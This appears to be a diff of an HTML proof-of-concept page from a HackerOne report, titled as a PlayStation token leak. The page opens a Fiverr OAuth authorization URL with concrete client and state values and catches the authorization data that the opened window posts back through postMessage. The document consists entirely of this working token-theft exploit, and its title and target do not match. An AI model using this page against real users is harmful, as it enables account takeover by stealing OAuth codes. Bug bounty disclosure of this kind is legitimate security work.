@@ -1,9 +1,26 @@
-<script>
-  function listener(event) {
-    alert(JSON.stringify(event.data));
-  }
-
-  var dest = window.open("https://accounts.fiverr.com/oauth2/authorize?client_id=1e353bd4bb26267118819a929020ca76&response_type=code&redirect_uri=https%3A%2F%2Fapp.workspace.fiverr.com%2Foauth%2Ffiverr&scope=openid+profile+email&state=d2e9136017f8-4eb6-8b4b-6b50e06d2f96&identity=1");
-  
-  window.addEventListener("message", listener);
-</script>
+<!Doctype HTML>
+<html>
+    <head>
+        <title>PlayStation Authorization Token Leaks via postMessage</title>
+    </head>
+    <body>
+        <script type="text/javascript">
+        window.addEventListener("load", () => {
+            document.getElementById("startBtn").addEventListener("click", () => {
+                var x = window.open('https://accounts.fiverr.com/oauth2/authorize?client_id=1e353bd4bb26267118819a929020ca76&response_type=code&redirect_uri=https%3A%2F%2Fapp.workspace.fiverr.com%2Foauth%2Ffiverr&scope=openid+profile+email&state=d2e9136017f8-4eb6-8b4b-6b50e06d2f96&identity=1', 'mywindow');
+                window.onmessage = (e) => {
+                    document.getElementById("token-plate").innerText = JSON.stringify(e.data);
+                }
+            });
+        });
+        </script>
+        <h1>PlayStation Authorization Token Leaks via postMessage</h1>
+        <button id="startBtn" style='padding: 0.5em; font-size: 1.2em; width: 200px;'>Start</button>
+        <div id="token-plate" style="margin: 1em; padding: 1.2em; border: 1px solid #ddd;">
+            <em>Token Plate</em>
+        </div>
+        <footer>
+            @nnez | HackerOne
+        </footer>
+    </body>
+</html>
